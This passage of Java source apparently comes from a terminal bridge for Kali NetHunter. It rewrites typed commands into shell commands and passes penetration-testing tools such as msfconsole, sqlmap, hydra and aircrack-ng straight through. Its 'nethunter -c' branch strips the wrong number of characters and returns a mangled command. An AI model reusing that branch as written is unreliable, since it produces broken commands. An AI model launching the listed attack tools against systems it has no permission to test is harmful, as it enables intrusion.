        } else if (trimmed.equals("pkg") || trimmed.startsWith("pkg ")) {
            if (trimmed.equalsIgnoreCase("pkg list-installed") || trimmed.equalsIgnoreCase("pkg list")) {
                return "dpkg -l";
            }
            return "apt-get" + (trimmed.length() > 3 ? trimmed.substring(3) : "");
        } else if (trimmed.equals("dpkg") || trimmed.startsWith("dpkg ")) {
            return trimmed;
        } else if (trimmed.equals("pip") || trimmed.startsWith("pip ")) {
            return trimmed;
        } else if (trimmed.equals("python") || trimmed.startsWith("python ")) {
            return trimmed;
        } else if (trimmed.equals("nh") || trimmed.equals("nethunter") || trimmed.equals("nh -s")) {
            return "echo 'NetHunter Terminal Bridge Active. Run tools directly (dpkg -l, apt-get update, nmap, sqlmap, etc.)'";
        } else if (trimmed.startsWith("nh -c ") || trimmed.startsWith("nethunter -c ")) {
            return trimmed.substring(6).trim();
        } else if (trimmed.startsWith("nh ") || trimmed.startsWith("nethunter ")) {
            return trimmed.substring(trimmed.indexOf(' ')).trim();
        } else if (trimmed.equals("kali")) {
            return "uname -a";
        } else if (trimmed.startsWith("kali ")) {
            return trimmed.substring(5).trim();
        } else if (trimmed.startsWith("msfconsole") || trimmed.startsWith("sqlmap") || trimmed.startsWith("hydra") || trimmed.startsWith("wifite") || trimmed.startsWith("aircrack-ng") || trimmed.startsWith("nmap")) {
            return trimmed;
        }
        return cmd;
    }
}
